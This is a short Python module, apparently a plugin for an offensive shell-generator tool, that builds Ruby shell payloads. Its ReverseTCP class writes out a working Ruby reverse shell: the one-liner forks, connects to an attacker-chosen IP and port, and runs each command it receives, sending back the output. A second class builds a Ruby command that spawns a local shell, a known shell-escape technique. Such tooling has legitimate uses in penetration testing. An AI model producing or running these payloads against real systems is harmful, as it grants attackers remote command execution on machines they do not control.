from ogabog.cores import plugin, const


class ReverseTCP(plugin.ReverseShell):
    def __init__(self):
        super().__init__()
        self.opts.description = "swisskyrepo/PayloadsAllTheThings"
        self.opts.description += "\nModule author: Nguyen Hoang Thanh <smith.nguyenhoangthanh@gmail.com>"
        self.shell_type = 1
        self.is_interactive = True

    def make_shell(self):
        self.shell = f"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{self.args.ip}\",\"{self.args.port}\");"
        self.shell += "while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'"


class Shell(plugin.BaseShell):
    def __init__(self):
        super().__init__()
        self.shell_type = 0
        self.is_interactive = True
        self.add_args(
            "--shell",
            default="bash",
            choices=const.LINUX_SHELL,
            help="Select shell type on target machine"
        )
        self.opts.description = "https://gtfobins.github.io/gtfobins/ruby/"
        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"

    def make_shell(self):
        self.shell = f"ruby -e 'exec(\"{self.args.shell}\")'"
